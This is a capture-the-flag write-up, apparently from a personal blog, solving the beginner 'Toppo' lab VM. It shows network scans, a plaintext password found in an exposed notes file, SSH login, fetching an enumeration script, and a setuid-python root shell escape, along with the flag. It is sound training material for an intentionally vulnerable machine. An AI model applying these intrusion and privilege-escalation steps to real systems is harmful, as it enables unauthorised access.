---
layout: post
title: CTF Toppo
date:   2022-01-22 10:54:42 -0600
categories: CTF
tags: Linux
---
# Description

```zsh
The Machine isn't hard to own and don't require advanced exploitation .
Level : Beginner
DHCP : activated
Inside the zip you will find a vmdk file , and I think you will be able to use it with any usual virtualization software ( tested with Virtualbox) .
If you have any question : my twitter is @h4d3sw0rm
Happy Hacking ! 
```

# Netdiscover
![](https://i.imgur.com/hFzxCnQ.png)
192.168.0.43

# nmap
```zsh
➜  ~ nmap -sV -p- 192.168.0.43
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-22 10:58 CET
Nmap scan report for 192.168.0.43
Host is up (0.011s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
56317/tcp open  status  1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.26 seconds
```
22, 80, 111, 56317

# Port 80
## Nikto
```zsh
+ OSVDB-3268: /admin/: Directory indexing found.
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3268: /mail/: Directory indexing found.
+ OSVDB-3092: /mail/: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
```
In the `admin` directory we have one file, notes.txt:
```zsh
Note to myself :

I need to change my password :/ 12345ted123 is too outdated but the technology isn't my thing i prefer go fishing or watching soccer .
```
Password: 12345ted123

# Port 22
ssh with the password ssh `ted@192.168.0.43`.
```zsh
ssh ted@192.168.0.43
```
I'm in

# lse.sh
```zsh
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
chmod +x lse.sh
./lse.sh
```
And this is what I found interesting:
```zsh
    Hostname: Toppo
       Linux: 3.16.0-4-586
Distribution: Debian GNU/Linux 8.10 (jessie)
Architecture: i686
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/usr/bin/python2.7
/usr/bin/mawk
---
[!] fst030 Can we write to any setuid binary?.............................. yes!
---
/usr/bin/python2.7
---
```
That's all.

Let's see what we can do with python.
# gtfobin
https://gtfobins.github.io/gtfobins/python/

```zsh
ted@Toppo:/home$ python
Python 2.7.9 (default, Aug 13 2016, 16:41:35) 
[GCC 4.9.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import os; os.system("/bin/sh")
# id
uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)
# whoami
root
```
# flag.txt
```zsh

cat /root/flag.txt
_________                                  
|  _   _  |                                 
|_/ | | \_|.--.   _ .--.   _ .--.    .--.   
    | |  / .'`\ \[ '/'`\ \[ '/'`\ \/ .'`\ \ 
   _| |_ | \__. | | \__/ | | \__/ || \__. | 
  |_____| '.__.'  | ;.__/  | ;.__/  '.__.'  
                 [__|     [__|              




Congratulations ! there is your flag : 0wnedlab{p4ssi0n_c0me_with_pract1ce}
```

































